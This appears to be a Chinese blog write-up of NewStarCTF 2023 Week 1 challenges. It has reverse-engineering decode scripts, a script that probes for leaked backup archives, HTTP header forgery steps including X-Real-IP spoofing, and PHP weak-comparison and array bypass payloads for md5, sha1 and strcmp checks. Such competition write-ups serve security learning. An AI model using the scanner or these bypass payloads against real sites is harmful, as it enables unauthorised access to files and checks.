<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>newstarctf | 花开再美，怎如初见..?</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Week1reELF123456string&#x3D;&quot;V\QWkt $_e&amp;#x27;^_ggXQ&amp;#x27;u|v!c&#x2F;m&quot;string&#x3D;list(string)for i in range(len(string)):  string[i]&#x3D;ord(string[i])-16^0x20  print(chr(string[i]),end&#x3D;&amp;#x27;&amp;#x27;)  咳1">
<meta property="og:type" content="article">
<meta property="og:title" content="newstarctf">
<meta property="og:url" content="https://wuming.github.io/2023/09/25/newstarctf/index.html">
<meta property="og:site_name" content="花开再美，怎如初见..?">
<meta property="og:description" content="Week1reELF123456string&#x3D;&quot;V\QWkt $_e&amp;#x27;^_ggXQ&amp;#x27;u|v!c&#x2F;m&quot;string&#x3D;list(string)for i in range(len(string)):  string[i]&#x3D;ord(string[i])-16^0x20  print(chr(string[i]),end&#x3D;&amp;#x27;&amp;#x27;)  咳1">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.230oqvgvsl0g.png">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4llww5xoavc0.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4z413itworc0.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6u94htzuxh00.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6qq7ddqswc40.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.555xj0hd2z40.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7a5ebded1ug0.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.5yp1p5qib800.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2zgrkm49clg0.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.58yehkkyq3o0.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6725ejsqclg0.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6yqlt5zjs6k0.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.615ykeguv800.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7efhs05aa840.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2019h3nte800.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.15js7ajhu4f4.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1o5xgiwkpqtc.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2tryl616bns0.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.5d4k5tf47eg0.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.26iivmz0gklc.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.69alfdji2do0.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7h3oybqr9u80.webp">
<meta property="og:image" content="c:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231009132250253.png">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.212ogn4b84m8.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.39rvk8nhq8o0.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.786srgfovds0.webp">
<meta property="og:image" content="c:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231104221705868.png">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.313nazrf2zk0.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2h1t2uozbw80.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7fe1yvgdo6w0.webp">
<meta property="og:image" content="c:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231009195239402.png">
<meta property="og:image" content="c:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231009195316946.png">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.71s3irmk30w0.png">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1shi3av2lls0.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.10nfmyae5ark.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6qgr2vzu5zs0.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.5sjekino3y40.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.42d0t6dysw20.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1vc04muf6qyo.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.42u21lez2so0.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.68sh79tguhw0.webp">
<meta property="og:image" content="file:///D:/CTF/REVERSE/%E5%8F%AF%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6.png">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4gue0ombvhq0.webp">
<meta property="og:image" content="c:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231020200147972.png">
<meta property="og:image" content="c:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231021132353950.png">
<meta property="og:image" content="c:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231021132054978.png">
<meta property="og:image" content="c:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231021132942254.png">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2z3o4kl5wik0.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.12f1b96x3ti.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7041926o0hs0.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.70u11xfx8z80.webp">
<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6enz85e6lv40.webp">
<meta property="article:published_time" content="2023-09-25T03:01:20.000Z">
<meta property="article:modified_time" content="2023-11-04T14:17:08.198Z">
<meta property="article:author" content="wuming">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.230oqvgvsl0g.png">
  
    <link rel="alternative" href="/atom.xml" title="花开再美，怎如初见..?" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 6.3.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
				<img lazy-src="https://cdn.jsdelivr.net/gh/shenshuoyaoyouguangha/blogimg@master/202308172157431.png" class="js-avatar">
			
		</a>

		<hgroup>
			<h1 class="header-author"><a href="/">wuming</a></h1>
		</hgroup>

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">Home</a></li>
				        
							<li><a href="/archives">Archives</a></li>
				        
						</ul>
					</nav>
					<nav class="half-header-menu">
						<a class="hide">Home</a>
						<a>Tags</a>
						<a>Links</a>
						<a>About</a>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/shenshuoyaoyouguangha" title="github">github</a>
					        
								<a class="mail" target="_blank" href="mailto:2993669760@qq.com" title="mail">mail</a>
					        
								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
					        
						</div>
						<!-- music -->
						
							<!-- <div style="position: absolute; bottom: 120px; left: auto; width: 85%;"> -->
							<div style="position: absolute; left: auto; width: 85%;">
								<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=220 height=86 src="//music.163.com/outchain/player?type=2&id=1397345903&auto=1&height=66"></iframe>
							</div>
						
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/Pwn/" style="font-size: 10px;">Pwn</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/WEB/" style="font-size: 10px;">WEB</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/litctf/" style="font-size: 10px;">litctf</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/re/" style="font-size: 10px;">re</a> <a href="/tags/write-up/" style="font-size: 10px;">write up</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="/null">github</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">一名正在学习的ctfer...</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="https://cdn.jsdelivr.net/gh/shenshuoyaoyouguangha/blogimg@master/202308172157431.png" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">Home</a></li>
		        
					<li><a href="/archives">Archives</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/shenshuoyaoyouguangha" title="github">github</a>
			        
						<a class="mail" target="_blank" href="mailto:2993669760@qq.com" title="mail">mail</a>
			        
						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap"><article id="post-newstarctf" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/09/25/newstarctf/" class="article-date">
  	<time datetime="2023-09-25T03:01:20.000Z" itemprop="datePublished">2023-09-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      newstarctf
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">string=<span class="string">&quot;V\QWkt $_e&#x27;^_ggXQ&#x27;u|v!c/m&quot;</span></span><br><span class="line">string=<span class="built_in">list</span>(string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(string)):</span><br><span class="line">  string[i]=<span class="built_in">ord</span>(string[i])-<span class="number">16</span>^<span class="number">0x20</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">chr</span>(string[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="咳"><a href="#咳" class="headerlink" title="咳"></a>咳</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">string=<span class="string">&quot;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&quot;</span></span><br><span class="line">string=<span class="built_in">list</span>(string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(string)):</span><br><span class="line">  string[i]=<span class="built_in">ord</span>(string[i])-<span class="number">1</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">chr</span>(string[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="Segments"><a href="#Segments" class="headerlink" title="Segments"></a>Segments</h3><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.230oqvgvsl0g.png"></p>
<p>flag{You_ar3_g0od_at_f1nding_ELF_segments_name}</p>
<h3 id="AndroXor"><a href="#AndroXor" class="headerlink" title="AndroXor"></a>AndroXor</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">14</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="number">11</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>]</span><br><span class="line">ascii_values = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> key:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(item, <span class="built_in">int</span>):</span><br><span class="line">        ascii_values.append(item)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ascii_values.append(<span class="built_in">ord</span>(item))</span><br><span class="line"></span><br><span class="line">string2 = <span class="string">&quot;happyx3&quot;</span></span><br><span class="line">string2 = <span class="built_in">list</span>(string2)</span><br><span class="line">result = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ascii_values)):</span><br><span class="line">    char_code = ascii_values[i] ^ <span class="built_in">ord</span>(string2[i % <span class="built_in">len</span>(string2)])</span><br><span class="line">    result.append(<span class="built_in">chr</span>(char_code))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(result))</span><br></pre></td></tr></table></figure>

<h3 id="EzPE"><a href="#EzPE" class="headerlink" title="EzPE"></a>EzPE</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data = [</span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x1F</span>, <span class="number">0x26</span>, <span class="number">0x6C</span>, <span class="number">0x43</span>, <span class="number">0x2D</span>, <span class="number">0x3C</span>, <span class="number">0x0C</span>, </span><br><span class="line">  <span class="number">0x54</span>, <span class="number">0x4C</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x11</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x3A</span>, <span class="number">0x7C</span>, <span class="number">0x51</span>, </span><br><span class="line">  <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x36</span>, <span class="number">0x1F</span>, <span class="number">0x12</span>, <span class="number">0x26</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x68</span>, <span class="number">0x5D</span>, <span class="number">0x3F</span>, <span class="number">0x2D</span>, <span class="number">0x37</span>, <span class="number">0x2A</span>, <span class="number">0x7D</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data) - <span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    data[i] = data[i] ^ i ^ data[i+<span class="number">1</span>]</span><br><span class="line">    result += <span class="built_in">chr</span>(data[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">   <span class="built_in">print</span>(result[j],end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://9d41a563-79e3-4f30-a3d4-61e6e3246ede.node4.buuoj.cn:81&quot;</span></span><br><span class="line"></span><br><span class="line">li1 = [<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line">li2 = [<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;rar&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> li2:</span><br><span class="line">        url_final = url + <span class="string">&quot;/&quot;</span> + i + <span class="string">&quot;.&quot;</span> + j</span><br><span class="line">        r = requests.get(url_final)</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<p>通过脚本，扫描网站可以泄露的东西，最后发现是<a target="_blank" rel="noopener" href="http://www.zip,直接在网站最后加上,就可以下载一个www.zip,里面就包含了flag/">www.zip，直接在网站最后加上，就可以下载一个www.zip，里面就包含了flag</a></p>
<h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>抓包</p>
<h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><ul>
<li><p><strong>考点</strong>：Flask报错界面信息泄露</p>
</li>
<li><p><strong>FLAG</strong>：动态FLAG</p>
</li>
<li><p><strong>解题步骤</strong></p>
</li>
</ul>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4llww5xoavc0.webp" alt="image"></p>
<p>提示输入number1和number2，我们随便给其中一个传入数组就会发现</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4z413itworc0.webp" alt="image"></p>
<p>成功获取flag</p>
<h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><ul>
<li><p><strong>考点</strong>：HTTP常见请求头、HTTP请求方式</p>
</li>
<li><p><strong>FLAG</strong>：动态FLAG</p>
</li>
<li><p><strong>解题步骤</strong></p>
</li>
</ul>
<p>进入题目首先要求以GET方式传参：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://ec7fe482-428e-4978-8b2c-4016472b07a7.node4.buuoj.cn:81/index.php?ctf=ok">http://ec7fe482-428e-4978-8b2c-4016472b07a7.node4.buuoj.cn:81/index.php?ctf=ok</a></p>
</blockquote>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6u94htzuxh00.webp" alt="image"></p>
<p>右键查看页面源代码可以看到base64编码后的secret值：</p>
<p>base64解码得到</p>
<blockquote>
<p>n3wst4rCTF2023g00000d</p>
</blockquote>
<p>使用HackBar发送secret：</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6qq7ddqswc40.webp" alt="image"></p>
<p>接着题目要求power为ctfer，使用Burp Suite抓包修改Cookie值：</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.555xj0hd2z40.webp" alt="image"></p>
<p>接着修改U-A头为NewStarCTF2023：</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7a5ebded1ug0.webp" alt="image"></p>
<p>修改Referer头为newstarctf.com：</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.5yp1p5qib800.webp" alt="image"></p>
<p>添加X-Real-IP头，值为127.0.0.1，获得Flag：</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2zgrkm49clg0.webp" alt="image"></p>
<h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><ul>
<li><p><strong>考点</strong>：PHP弱类型、PHP加密函数数组绕过、PHP函数特性、变量覆盖漏洞</p>
</li>
<li><p><strong>FLAG</strong>：动态FLAG</p>
</li>
<li><p><strong>解题步骤</strong></p>
</li>
</ul>
<p>题目分为五个关卡。</p>
<p>第一关主要考察PHP中md5弱类型比较的特点，只需要找到两个值不同但md5值以0e开头的字符串即可通过本关，原理是0e在进行弱类型比较时会被当作科学计数法进行比较。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;    <span class="keyword">echo</span> <span class="string">&quot;=Level 1&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$flag1 </span>= True;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 1&quot;</span>);</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>构造Payload如下：</p>
<p>key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708</p>
<p>第二关主要考察PHP哈希函数的特性，在处理数组类型的传参时，md5、sha1等哈希函数会返回NULL值，由此可以构造出NULL&#x3D;&#x3D;&#x3D;NULL从而通过判断。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 2=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$flag2 </span>= True;</span><br><span class="line">       &#125;    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;        </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 2&quot;</span>); </span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708</p>
</blockquote>
<blockquote>
<p>POST-DATA: key3[]&#x3D;1</p>
</blockquote>
<p>第三关主要考察strcmp函数特性，如果传入的参数为数组类型，该函数就会返回NULL值，构造NULL&#x3D;&#x3D;0从而通过判断</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;=Level 3=&quot;</span>;</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;</span><br><span class="line"> <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">  <span class="variable">$flag3</span> = True;</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 3&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造Payload如下：</p>
<blockquote>
<p>key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708&amp;key4[]&#x3D;2</p>
<p>POST-DATA: key3[]&#x3D;1</p>
</blockquote>
<p>第四关主要考察is_numeric函数特性，在传入的数字后加入任意字母即可通过本层的判断。</p>
